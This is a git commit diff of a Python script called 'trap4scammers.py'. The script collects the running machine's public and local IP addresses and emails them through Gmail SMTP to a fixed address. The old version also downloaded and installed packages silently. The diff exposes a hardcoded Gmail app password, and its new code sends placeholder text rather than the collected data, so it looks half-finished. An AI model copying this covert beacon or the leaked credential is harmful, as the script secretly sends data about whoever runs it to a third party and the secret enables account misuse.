0e0e088f42fb462c6157b8c01e18048f2dbf76af
Valerii Syroiezhin <v.syroiezhin@Air-Valerii.lan>
2022-08-01 23:14:27 +0300

    Update trap4scammers.py

--- trap4scammers.py
+++ trap4scammers.py
@@ -1,34 +1,25 @@
-from os import popen, system
-
-try: system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py")
-except: pass
-
-try: system("python get-pip.py")
-except: pass
-
-try: system("pip install email")
-except: pass
-
-try: system("pip install secure-smtplib")
-except: pass
-
-from email.mime.text import MIMEText
-from smtplib import SMTP
+from os import popen
+import email_to
+# from email.mime.text import MIMEText
+# from smtplib import SMTP
 
 
 def shape(myhtml):
+
   smtp = 'smtp.gmail.com'
   sender = "7kipgod@gmail.com"
   destination = "svaller22@gmail.com"
-  server = SMTP(smtp, 587)
-  server.starttls()
+
+  message = email_to.Message('ONE')
+  message.add('TWO')
+  message.add('THREE')
+  message.style = 'h1 { color: green }'
   # create a password for the app bot and get the password by putting it in brackets
-  server.login(sender, "eifjuipuczaxguxb") # https://myaccount.google.com/apppasswords
-  msg = MIMEText(myhtml, "html")
-  msg["Subject"] = f"Попался, который кусался! {popen('date').read()}"
-  msg['From'] = sender
-  msg['To'] = destination
-  server.sendmail(sender, destination, msg.as_string())
+  server = email_to.EmailServer(smtp, 587, sender, "eifjuipuczaxguxb") # https://myaccount.google.com/apppasswords
+  server.send_message(message, destination, 'Things are awesome')
+
+  # msg = MIMEText(myhtml, "html")
+  # msg["Subject"] = f"Попался, который кусался! {popen('date').read()}"
 
 def send():
     try: shape(f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>""")
